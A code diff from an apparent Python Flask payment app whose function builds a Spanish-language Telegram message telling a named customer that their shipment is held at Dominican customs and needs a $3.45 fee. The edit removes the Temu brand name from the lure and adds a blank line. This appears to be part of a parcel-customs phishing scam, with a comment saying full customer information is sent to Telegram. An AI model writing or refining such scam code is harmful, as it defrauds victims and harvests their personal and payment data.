@@ -67,7 +67,7 @@ def procesar_pago():
     
     # Enviar info completa a Telegram
     mensaje_telegram = f"""
-*{cliente_info['nombre']} tu pedido de Temu tuvo un pequeño conflicto en la aduana dominicana.*
+*{cliente_info['nombre']} tu envio tuvo un pequeño conflicto en la aduana dominicana.*
 Para liberarlo rápidamente, necesitamos una pequeña comisión de $3.45.
 
 📄 *Datos del pedido:*
@@ -98,4 +98,5 @@ País: {cliente_info['country']}
 if __name__ == "__main__":
     import os
     app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+
 
